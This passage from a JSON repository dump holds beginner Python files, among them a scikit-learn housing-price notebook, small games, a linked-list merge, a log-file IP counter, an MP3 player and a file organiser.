<td>0.000000</td>\\n\",\n       \"      <td>5.190000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.453000</td>\\n\",\n       \"      <td>5.878750</td>\\n\",\n       \"      <td>44.850000</td>\\n\",\n       \"      <td>2.035975</td>\\n\",\n       \"      <td>4.000000</td>\\n\",\n       \"      <td>284.000000</td>\\n\",\n       \"      <td>17.400000</td>\\n\",\n       \"      <td>374.617500</td>\\n\",\n       \"      <td>6.847500</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>50%</th>\\n\",\n       \"      <td>0.286735</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>9.900000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.538000</td>\\n\",\n       \"      <td>6.210000</td>\\n\",\n       \"      <td>78.200000</td>\\n\",\n       \"      <td>3.122200</td>\\n\",\n       \"      <td>5.000000</td>\\n\",\n       \"      <td>337.000000</td>\\n\",\n       \"      <td>19.000000</td>\\n\",\n       \"      <td>390.955000</td>\\n\",\n       \"      <td>11.570000</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>75%</th>\\n\",\n       \"      <td>3.731923</td>\\n\",\n       \"      <td>12.500000</td>\\n\",\n       \"      <td>18.100000</td>\\n\",\n       \"      <td>0.000000</td>\\n\",\n       \"      <td>0.631000</td>\\n\",\n       \"      <td>6.630250</td>\\n\",\n       \"      <td>94.100000</td>\\n\",\n       \"      <td>5.100400</td>\\n\",\n       \"      <td>24.000000</td>\\n\",\n       \"      <td>666.000000</td>\\n\",\n       \"      <td>20.200000</td>\\n\",\n       \"      <td>395.630000</td>\\n\",\n       \"      <td>17.102500</td>\\n\",\n       \"    </tr>\\n\",\n       \"    <tr>\\n\",\n       \"      <th>max</th>\\n\",\n       \"      <td>73.534100</td>\\n\",\n       \"      <td>100.000000</td>\\n\",\n       \"      <td>27.740000</td>\\n\",\n       \"      <td>1.000000</td>\\n\",\n       \"      <td>0.871000</td>\\n\",\n       \"      <td>8.780000</td>\\n\",\n       \"      <td>100.000000</td>\\n\",\n       \"      <td>12.126500</td>\\n\",\n       \"      <td>24.000000</td>\\n\",\n       \"      <td>711.000000</td>\\n\",\n       \"      <td>22.000000</td>\\n\",\n       \"      <td>396.900000</td>\\n\",\n       \"      <td>36.980000</td>\\n\",\n       \"    </tr>\\n\",\n       \"  </tbody>\\n\",\n       \"</table>\\n\",\n       \"</div>\"\n      ],\n      \"text/plain\": [\n       \"            CRIM           ZN       INDUS        CHAS         NOX          RM  \\\\\\n\",\n       \"count  404.000000  404.000000  404.000000  404.000000  404.000000  404.000000   \\n\",\n       \"mean     3.602814   10.836634   11.344950    0.069307    0.558064    6.279908   \\n\",\n       \"std      8.099383   22.150636    6.877817    0.254290    0.116875    0.712983   \\n\",\n       \"min      0.006320    0.000000    0.740000    0.000000    0.389000    3.561000   \\n\",\n       \"25%      0.086963    0.000000    5.190000    0.000000    0.453000    5.878750   \\n\",\n       \"50%      0.286735    0.000000    9.900000    0.000000    0.538000    6.210000   \\n\",\n       \"75%      3.731923   12.500000   18.100000    0.000000    0.631000    6.630250   \\n\",\n       \"max     73.534100  100.000000   27.740000    1.000000    0.871000    8.780000   \\n\",\n       \"\\n\",\n       \"              AGE         DIS         RAD         TAX     PTRATIO           B  \\\\\\n\",\n       \"count  404.000000  404.000000  404.000000  404.000000  404.000000  404.000000   \\n\",\n       \"mean    69.039851    3.746210    9.735149  412.341584   18.473267  353.392822   \\n\",\n       \"std     28.258248    2.099057    8.731259  168.672623    2.129243   96.069235   \\n\",\n       \"min      2.900000    1.129600    1.000000  187.000000   13.000000    0.320000   \\n\",\n       \"25%     44.850000    2.035975    4.000000  284.000000   17.400000  374.617500   \\n\",\n       \"50%     78.200000    3.122200    5.000000  337.000000   19.000000  390.955000   \\n\",\n       \"75%     94.100000    5.100400   24.000000  666.000000   20.200000  395.630000   \\n\",\n       \"max    100.000000   12.126500   24.000000  711.000000   22.000000  396.900000   \\n\",\n       \"\\n\",\n       \"            LSTAT  \\n\",\n       \"count  404.000000  \\n\",\n       \"mean    12.791609  \\n\",\n       \"std      7.235740  \\n\",\n       \"min      1.730000  \\n\",\n       \"25%      6.847500  \\n\",\n       \"50%     11.570000  \\n\",\n       \"75%     17.102500  \\n\",\n       \"max     36.980000  \"\n      ]\n     },\n     \"execution_count\": 26,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"X= imputer.transform(housing)\\n\",\n    \"housing_tr =pd.DataFrame(X,columns = housing.columns)\\n\",\n    \"housing_tr.describe()\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"## Scikit-learn Design \"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"Basically, there are 3 types of objects:\\n\",\n    \"1. Estimators - it estimates some parameter based on a dataset. Eg. imputer. It has a fit method and transform method.Fit method -Fits the dataset and calculates internal parameters\\n\",\n    \"\\n\",\n    \"2. Transformers - transform method takes input and returns output based on the learning from fit(). It also has a convenience function called fit_transform() which fits and then transforms.\\n\",\n    \"\\n\",\n    \"3. Predictors - LinearRegression model is an example of predictor. fit() and predict() are two common functions. It also gives score() function which will evaluate the predictions.\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"## Feature Scaling\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"Primarily, two types of features scaling methods:\\n\",\n    \"1. Min-max scaling (Normalization)\\n\",\n    \"   0 < (value-min)/(max-min) >1\\n\",\n    \"   Sklearn provides a class called MinMaxScaler for this\\n\",\n    \"   \\n\",\n    \"2. Standardization\\n\",\n    \"   (value-mean)/std\\n\",\n    \"   Sklearn provides a class called StandardScaler for this\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 27,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"from sklearn.pipeline import Pipeline\\n\",\n    \"from sklearn.preprocessing import StandardScaler\\n\",\n    \"my_pipeline= Pipeline([\\n\",\n    \"    ('imputer',SimpleImputer(strategy=\\\"median\\\")),\\n\",\n    \"    ('std_scaler',StandardScaler())\\n\",\n    \"])\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 28,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"housing_num_tr =my_pipeline.fit_transform(housing)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 29,\n   \"metadata\": {\n    \"scrolled\": true\n   },\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"(404, 13)\"\n      ]\n     },\n     \"execution_count\": 29,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"housing_num_tr.shape\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"## Selecting a desired model\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 30,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"RandomForestRegressor()\"\n      ]\n     },\n     \"execution_count\": 30,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"from sklearn.linear_model import LinearRegression\\n\",\n    \"from sklearn.tree import DecisionTreeRegressor\\n\",\n    \"from sklearn.ensemble import RandomForestRegressor\\n\",\n    \"#model = LinearRegression()\\n\",\n    \"#model = DecisionTreeRegressor()\\n\",\n    \"model = RandomForestRegressor()\\n\",\n    \"model.fit(housing_num_tr, housing_labels)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 31,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"some_data = housing.iloc[:5]\\n\",\n    \"some_labels = housing_labels.iloc[:5]\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 32,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"prepared_data = my_pipeline.transform(some_data)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 33,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"array([22.508, 25.587, 16.363, 23.376, 23.391])\"\n      ]\n     },\n     \"execution_count\": 33,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"model.predict(prepared_data)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 34,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"[21.9, 24.5, 16.7, 23.1, 23.0]\"\n      ]\n     },\n     \"execution_count\": 34,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"list(some_labels)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 35,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"from sklearn.metrics import mean_squared_error\\n\",\n    \"housing_predictions=model.predict(housing_num_tr)\\n\",\n    \"lin_mse= mean_squared_error(housing_labels, housing_predictions)\\n\",\n    \"lin_rmse=np.sqrt(lin_mse)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 36,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"1.3529252128712854\"\n      ]\n     },\n     \"execution_count\": 36,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"lin_mse\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 37,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"1.1631531338870584\"\n      ]\n     },\n     \"execution_count\": 37,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"lin_rmse\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"## Cross Validation\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 38,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"from sklearn.model_selection import cross_val_score\\n\",\n    \"scores = cross_val_score(model, housing_num_tr, housing_labels,scoring=\\\"neg_mean_squared_error\\\",cv=10)\\n\",\n    \"rmse_scores = np.sqrt(-scores)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 39,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"array([2.79289168, 2.69441597, 4.40018895, 2.56972379, 3.33073436,\\n\",\n       \"       2.62687167, 4.77007351, 3.27403209, 3.38378214, 3.16691711])\"\n      ]\n     },\n     \"execution_count\": 39,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"rmse_scores\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 40,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"def print_scores(scores):\\n\",\n    \"    print(\\\"scores: \\\",scores)\\n\",\n    \"    print(\\\"Mean: \\\",scores.mean())\\n\",\n    \"    print(\\\"Standard deviation: \\\",scores.std()) \"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 41,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"name\": \"stdout\",\n     \"output_type\": \"stream\",\n     \"text\": [\n      \"scores:  [2.79289168 2.69441597 4.40018895 2.56972379 3.33073436 2.62687167\\n\",\n      \" 4.77007351 3.27403209 3.38378214 3.16691711]\\n\",\n      \"Mean:  3.3009631251857217\\n\",\n      \"Standard deviation:  0.7076841067486248\\n\"\n     ]\n    }\n   ],\n   \"source\": [\n    \"print_scores(rmse_scores)\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"## Saving Model \"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 42,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"['HousingPricePredicter.joblib']\"\n      ]\n     },\n     \"execution_count\": 42,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"from joblib import dump, load\\n\",\n    \"dump(model, 'HousingPricePredicter.joblib')\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"## Testing the model on test data \"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 43,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"X_test = strat_test_set.drop(\\\"MEDV\\\" , axis=1)\\n\",\n    \"Y_test = strat_test_set[\\\"MEDV\\\"].copy()\\n\",\n    \"X_test_prepared = my_pipeline.transform(X_test)\\n\",\n    \"final_predictions = model.predict(X_test_prepared)\\n\",\n    \"final_mse = mean_squared_error(Y_test, final_predictions)\\n\",\n    \"final_rmse = np.sqrt(final_mse)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 44,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"2.948844070638726\"\n      ]\n     },\n     \"execution_count\": 44,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"final_rmse\"\n   ]\n  }\n ],\n \"metadata\": {\n  \"kernelspec\": {\n   \"display_name\": \"Python 3\",\n   \"language\": \"python\",\n   \"name\": \"python3\"\n  },\n  \"language_info\": {\n   \"codemirror_mode\": {\n    \"name\": \"ipython\",\n    \"version\": 3\n   },\n   \"file_extension\": \".py\",\n   \"mimetype\": \"text/x-python\",\n   \"name\": \"python\",\n   \"nbconvert_exporter\": \"python\",\n   \"pygments_lexer\": \"ipython3\",\n   \"version\": \"3.8.2\"\n  }\n },\n \"nbformat\": 4,\n \"nbformat_minor\": 4\n}\n"
        },
        {
          "name": "Mad Libs Generator.py",
          "type": "blob",
          "size": 0.8701171875,
          "content": "#Loop back to this point once code finishes\nloop = 1\nwhile (loop < 10):\n# All the questions that the program asks the user\n    noun = input(\"Choose a noun: \")\n    p_noun = input(\"Choose a plural noun: \")\n    noun2 = input(\"Choose a noun: \")\n    place = input(\"Name a place: \")\n    adjective = input(\"Choose an adjective (Describing word): \")\n    noun3 = input(\"Choose a noun: \")\n# Displays the story based on the users input\n    print (\"------------------------------------------\")\n    print (\"Be kind to your\",noun,\"- footed\", p_noun)\n    print (\"For a duck may be somebody's\", noun2,\",\")\n    print (\"Be kind to your\",p_noun,\"in\",place)\n    print (\"Where the weather is always\",adjective,\".\")\n    print ()\n    print (\"You may think that is this the\",noun3,\",\")\n    print (\"Well it is.\")\n    print (\"------------------------------------------\")\n# Loop back to \"loop = 1\"\n    loop = loop + 1\n"
        },
        {
          "name": "Memory_game.py",
          "type": "blob",
          "size": 1.5478515625,
          "content": "import random\n\nimport simplegui\n\n\ndef new_game():\n    global card3, po, state, exposed, card1\n\n    def create(card):\n        while len(card) != 8:\n            num = random.randrange(0, 8)\n            if num not in card:\n                card.append(num)\n        return card\n\n    card3 = []\n    card1 = []\n    card2 = []\n    po = []\n    card1 = create(card1)\n    card2 = create(card2)\n    card1.extend(card2)\n    random.shuffle(card1)\n    state = 0\n    exposed = []\n    for i in range(0, 16, 1):\n        exposed.insert(i, False)\n\n\ndef mouseclick(pos):\n    global card3, po, state, exposed, card1\n    if state == 2:\n        if card3[0] != card3[1]:\n            exposed[po[0]] = False\n            exposed[po[1]] = False\n        card3 = []\n        state = 0\n        po = []\n    ind = pos[0] // 50\n    card3.append(card1[ind])\n    po.append(ind)\n    if exposed[ind] == False and state < 2:\n        exposed[ind] = True\n        state += 1\n\n\ndef draw(canvas):\n    global card1\n    gap = 0\n    for i in range(0, 16, 1):\n        if exposed[i] == False:\n            canvas.draw_polygon(\n                [[0 + gap, 0], [0 + gap, 100], [50 + gap, 100], [50 + gap, 0]],\n                1,\n                \"Black\",\n                \"Green\",\n            )\n        elif exposed[i] == True:\n            canvas.draw_text(str(card1[i]), [15 + gap, 65], 50, \"White\")\n        gap += 50\n\n\nframe = simplegui.create_frame(\"Memory\", 800, 100)\nframe.add_button(\"Reset\", new_game)\nlabel = frame.add_label(\"Turns = 0\")\n\nframe.set_mouseclick_handler(mouseclick)\nframe.set_draw_handler(draw)\n\nnew_game()\nframe.start()\n"
        },
        {
          "name": "Merge_linked_list.py",
          "type": "blob",
          "size": 2.369140625,
          "content": "# Python3 program merge two sorted linked\n# in third linked list using recursive.\n\n# Node class\nclass Node:\n    def __init__(self, data):\n        self.data = data\n        self.next = None\n\n\n# Constructor to initialize the node object\nclass LinkedList:\n\n    # Function to initialize head\n    def __init__(self):\n        self.head = None\n        self.tail = None\n\n    # Method to print linked list\n    def printList(self):\n        temp = self.head\n\n        while temp:\n            print(temp.data, end=\"->\")\n            temp = temp.next\n\n    # Function to add of node at the end.\n    def append(self, new_data):\n        new_node = Node(new_data)\n\n        if self.head is None:\n            self.head = new_node\n            self.tail = new_node\n            return\n        self.tail.next = new_node\n        self.tail = self.tail.next\n\n\n# Function to merge two sorted linked list.\ndef mergeLists(head1, head2):\n\n    # create a temp node NULL\n    temp = None\n\n    # List1 is empty then return List2\n    if head1 is None:\n        return head2\n\n    # if List2 is empty then return List1\n    if head2 is None:\n        return head1\n\n    # If List1's data is smaller or\n    # equal to List2's data\n    if head1.data <= head2.data:\n\n        # assign temp to List1's data\n        temp = head1\n\n        # Again check List1's data is smaller or equal List2's\n        # data and call mergeLists function.\n        temp.next = mergeLists(head1.next, head2)\n\n    else:\n        # If List2's data is greater than or equal List1's\n        # data assign temp to head2\n        temp = head2\n\n        # Again check List2's data is greater or equal List's\n        # data and call mergeLists function.\n        temp.next = mergeLists(head1, head2.next)\n\n    # return the temp list.\n    return temp\n\n\n# Driver Function\nif __name__ == \"__main__\":\n\n    # Create linked list :\n    # 10->20->30->40->50\n    list1 = LinkedList()\n    list1.append(10)\n    list1.append(20)\n    list1.append(30)\n    list1.append(40)\n    list1.append(50)\n\n    # Create linked list 2 :\n    # 5->15->18->35->60\n    list2 = LinkedList()\n    list2.append(5)\n    list2.append(15)\n    list2.append(18)\n    list2.append(35)\n    list2.append(60)\n\n    # Create linked list 3\n    list3 = LinkedList()\n\n    # Merging linked list 1 and linked list 2\n    # in linked list 3\n    list3.head = mergeLists(list1.head, list2.head)\n\n    print(\" Merged Linked List is : \", end=\"\")\n    list3.printList()\n"
        },
        {
          "name": "MobiusFunction.py",
          "type": "blob",
          "size": 0.7939453125,
          "content": "def is_square_free(factors):\n    \"\"\"\n    This functions takes a list of prime factors as input.\n    returns True if the factors are square free.\n    \"\"\"\n    for i in factors:\n        if factors.count(i) > 1:\n            return False\n    return True\n\n\ndef prime_factors(n):\n    \"\"\"\n    Returns prime factors of n as a list.\n    \"\"\"\n    i = 2\n    factors = []\n    while i * i <= n:\n        if n % i:\n            i += 1\n        else:\n            n //= i\n            factors.append(i)\n    if n > 1:\n        factors.append(n)\n    return factors\n\n\ndef mobius_function(n):\n    \"\"\"\n    Defines Mobius function\n    \"\"\"\n    factors = prime_factors(n)\n    if is_square_free(factors):\n        if len(factors) % 2 == 0:\n            return 1\n        elif len(factors) % 2 != 0:\n            return -1\n    else:\n        return 0\n"
        },
        {
          "name": "Model Usage.ipynb",
          "type": "blob",
          "size": 1.314453125,
          "content": "{\n \"cells\": [\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 1,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"from joblib import dump, load\\n\",\n    \"import numpy as np\\n\",\n    \"model = load('HousingPricePredicter.joblib')\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 2,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"features = np.array([[-0.43942006,  3.12628155, -1.12165014, -0.27288841, -1.42262747,\\n\",\n    \"       -0.24141041, -1.31238772,  2.61111401, -1.0016859 , -0.5778192 ,\\n\",\n    \"       -0.97491834,  0.41164221, -0.86091034]])\\n\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 3,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"array([22.508])\"\n      ]\n     },\n     \"execution_count\": 3,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"model.predict(features)\"\n   ]\n  }\n ],\n \"metadata\": {\n  \"kernelspec\": {\n   \"display_name\": \"Python 3\",\n   \"language\": \"python\",\n   \"name\": \"python3\"\n  },\n  \"language_info\": {\n   \"codemirror_mode\": {\n    \"name\": \"ipython\",\n    \"version\": 3\n   },\n   \"file_extension\": \".py\",\n   \"mimetype\": \"text/x-python\",\n   \"name\": \"python\",\n   \"nbconvert_exporter\": \"python\",\n   \"pygments_lexer\": \"ipython3\",\n   \"version\": \"3.8.2\"\n  }\n },\n \"nbformat\": 4,\n \"nbformat_minor\": 4\n}\n"
        },
        {
          "name": "Monitor Apache",
          "type": "blob",
          "size": 0.912109375,
          "content": "Monitor Apache / Nginx Log File\nCount the number of hits in a Apache/Nginx\nThis small script will count the number of hits in a Apache/Nginx log file. \nHow it works\nThis script can easily be adapted to any other log file. \n\nThe script starts with making an empty dictionary for storing the IP addresses andcount how many times they exist. \n\nThen we open the file (in this example the Nginx access.log file) and read the\ncontent line by line. \n\nThe for loop go through the file and splits the strings to get the IP address. \n\nThe len() function is used to ensure the length of IP address. \n\nIf the IP already exists , increase by 1.\nips = {}\n\nfh = open(\"/var/log/nginx/access.log\", \"r\").readlines()\nfor line in fh:\n    ip = line.split(\" \")[0]\n    if 6 < len(ip) <=15:\n        ips[ip] = ips.get(ip, 0) + 1\nprint ips\nTest it out\nIf you now browse to your website, and run the python script, you should see your IP address + the counts. \n"
        },
        {
          "name": "Mp3_media_player.py",
          "type": "blob",
          "size": 1.7978515625,
          "content": "# its very amazing\nimport os\nfrom tkinter.filedialog import askdirectory\n\nimport pygame\nfrom mutagen.id3 import ID3\nfrom tkinter import *\n\nroot = Tk()\nroot.minsize(300, 300)\n\n\nlistofsongs = []\nrealnames = []\n\nv = StringVar()\nsonglabel = Label(root, textvariable=v, width=35)\n\nindex = 0\n\n\ndef directorychooser():\n\n    directory = askdirectory()\n    os.chdir(directory)\n\n    for files in os.listdir(directory):\n        if files.endswith(\".mp3\"):\n\n            realdir = os.path.realpath(files)\n            audio = ID3(realdir)\n            realnames.append(audio[\"TIT2\"].text[0])\n\n            listofsongs.append(files)\n\n    pygame.mixer.init()\n    pygame.mixer.music.load(listofsongs[0])\n    # pygame.mixer.music.play()\n\n\ndirectorychooser()\n\n\ndef updatelabel():\n    global index\n    global songname\n    v.set(realnames[index])\n    # return songname\n\n\ndef nextsong(event):\n    global index\n    index += 1\n    pygame.mixer.music.load(listofsongs[index])\n    pygame.mixer.music.play()\n    updatelabel()\n\n\ndef prevsong(event):\n    global index\n    index -= 1\n    pygame.mixer.music.load(listofsongs[index])\n    pygame.mixer.music.play()\n    updatelabel()\n\n\ndef stopsong(event):\n    pygame.mixer.music.stop()\n    v.set(\"\")\n    # return songname\n\n\nlabel = Label(root, text=\"Music Player\")\nlabel.pack()\n\nlistbox = Listbox(root)\nlistbox.pack()\n\n# listofsongs.reverse()\nrealnames.reverse()\n\nfor items in realnames:\n    listbox.insert(0, items)\n\nrealnames.reverse()\n# listofsongs.reverse()\n\n\nnextbutton = Button(root, text=\"Next Song\")\nnextbutton.pack()\n\npreviousbutton = Button(root, text=\"Previous Song\")\npreviousbutton.pack()\n\nstopbutton = Button(root, text=\"Stop Music\")\nstopbutton.pack()\n\n\nnextbutton.bind(\"<Button-1>\", nextsong)\npreviousbutton.bind(\"<Button-1>\", prevsong)\nstopbutton.bind(\"<Button-1>\", stopsong)\n\nsonglabel.pack()\n\n\nroot.mainloop()\n"
        },
        {
          "name": "Multiply.py",
          "type": "blob",
          "size": 0.2568359375,
          "content": "def product(a,b):\n     if(a<b):\n         return product(b,a)\n     elif(b!=0):\n         return(a+product(a,b-1))\n     else:\n          return 0\n          \na=int(input(\"Enter first number: \"))\nb=int(input(\"Enter second number: \"))\nprint(\"Product is: \",product(a,b))\n"
        },
        {
          "name": "MySQL_Databses.py",
          "type": "blob",
          "size": 0.3310546875,
          "content": "import mysql.connector\n\n# MySQl databses details\n\nmydb = mysql.connector.connect(\n    host=\"0.0.0.0\", user=\"root\", passwd=\"\", database=\"db_name\"\n)\nmycursor = mydb.cursor()\n\n# Execute SQL Query =>>>> mycursor.execute(\"SQL Query\")\nmycursor.execute(\"SELECT column FROM table\")\n\nmyresult = mycursor.fetchall()\n\nfor x in myresult:\n    print(x)\n"
        },
        {
          "name": "News_App",
          "type": "tree",
          "content": null
        },
        {
          "name": "Number reverse.py",
          "type": "blob",
          "size": 0.1259765625,
          "content": "n=int(input(\"Enter number: \"))\nrev=0\nwhile(n>0):\n    dig=n%10\n    rev=rev*10+dig\n    n=n//10\nprint(\"Reverse of the number:\",rev)\n"
        },
        {
          "name": "Organise.py",
          "type": "blob",
          "size": 2.5166015625,
          "content": "from __future__ import print_function\r\n\r\nimport os\r\nimport shutil\r\nimport sys\r\n\r\nEXT_VIDEO_LIST = [\"FLV\", \"WMV\", \"MOV\", \"MP4\", \"MPEG\", \"3GP\", \"MKV\", \"AVI\"]\r\nEXT_IMAGE_LIST = [\"JPG\", \"JPEG\", \"GIF\", \"PNG\", \"SVG\"]\r\nEXT_DOCUMENT_LIST = [\r\n    \"DOC\",\r\n    \"DOCX\",\r\n    \"PPT\",\r\n    \"PPTX\",\r\n    \"PAGES\",\r\n    \"PDF\",\r\n    \"ODT\",\r\n    \"ODP\",\r\n    \"XLSX\",\r\n    \"XLS\",\r\n    \"ODS\",\r\n    \"TXT\",\r\n    \"IN\",\r\n    \"OUT\",\r\n    \"MD\",\r\n]\r\nEXT_MUSIC_LIST = [\"MP3\", \"WAV\", \"WMA\", \"MKA\", \"AAC\", \"MID\", \"RA\", \"RAM\", \"RM\", \"OGG\"]\r\nEXT_CODE_LIST = [\"CPP\", \"RB\", \"PY\", \"HTML\", \"CSS\", \"JS\"]\r\nEXT_EXECUTABLE_LIST = [\"LNK\", \"DEB\", \"EXE\", \"SH\", \"BUNDLE\"]\r\nEXT_COMPRESSED_LIST = [\r\n    \"RAR\",\r\n    \"JAR\",\r\n    \"ZIP\",\r\n    \"TAR\",\r\n    \"MAR\",\r\n    \"ISO\",\r\n    \"LZ\",\r\n    \"7ZIP\",\r\n    \"TGZ\",\r\n    \"GZ\",\r\n    \"BZ2\",\r\n]\r\n\r\n# Taking the location of the Folder to Arrange\r\ntry:\r\n    destLocation = str(sys.argv[1])\r\nexcept IndexError:\r\n    destLocation = str(input(\"Enter the Path of directory: \"))\r\n\r\n\r\n# When we make a folder that already exist then WindowsError happen\r\n# Changing directory may give WindowsError\r\ndef ChangeDirectory(dir):\r\n    try:\r\n        os.chdir(dir)\r\n    except WindowsError:\r\n        print(\"Error! Cannot change the Directory\")\r\n        print(\"Enter a valid directory!\")\r\n        ChangeDirectory(str(input(\"Enter the Path of directory: \")))\r\n\r\n\r\nChangeDirectory(destLocation)\r\n\r\n\r\ndef Organize(dirs, name):\r\n    try:\r\n        os.mkdir(name)\r\n        print(\"{} Folder Created\".format(name))\r\n    except WindowsError:\r\n        print(\"{} Folder Exist\".format(name))\r\n\r\n    src = \"{}\\\\{}\".format(destLocation, dirs)\r\n    dest = \"{}\\{}\".format(destLocation, name)\r\n\r\n    os.chdir(dest)\r\n    shutil.move(src, \"{}\\\\{}\".format(dest, dirs))\r\n\r\n    print(os.getcwd())\r\n    os.chdir(destLocation)\r\n\r\n\r\nTYPES_LIST = [\r\n    \"Video\",\r\n    \"Images\",\r\n    \"Documents\",\r\n    \"Music\",\r\n    \"Codes\",\r\n    \"Executables\",\r\n    \"Compressed\",\r\n]\r\nfor dirs in os.listdir(os.getcwd()):\r\n    if 1:\r\n        for name, extensions_list in zip(\r\n            TYPES_LIST,\r\n            [\r\n                EXT_VIDEO_LIST,\r\n                EXT_IMAGE_LIST,\r\n                EXT_DOCUMENT_LIST,\r\n                EXT_MUSIC_LIST,\r\n                EXT_CODE_LIST,\r\n                EXT_EXECUTABLE_LIST,\r\n                EXT_COMPRESSED_LIST,\r\n            ],\r\n        ):\r\n            if dirs.split(\".\")[-1].upper() in extensions_list:\r\n                Organize(dirs, name)\r\n    else:\r\n        if dirs not in TYPES_LIST:\r\n            Organize(dirs, \"Folders\")\r\n\r\nprint(\"Done Arranging Files and Folder in your specified directory\")\r\n"
        },
        {
          "name": "PDF",
          "type": "tree",
          "content": null
        },
        {
          "name": "PDFtoAudiobook.py",
          "type": "blob",
          "size": 0.248046875,
          "content": "import pyttsx3\nimport pyPDF2\nbook = open('book.pdf','rb')\npdfreader = pyPDF2.PdfFileReader(book)\npages = pdfreader.numPages\nprint(pages)\nspeaker = pyttsx3.init()\npage= pdfreader.getpage(7)\ntext = page.extractText()\nspeaker.say(text)\nspeaker.runAndWait()\n"
        },
        {
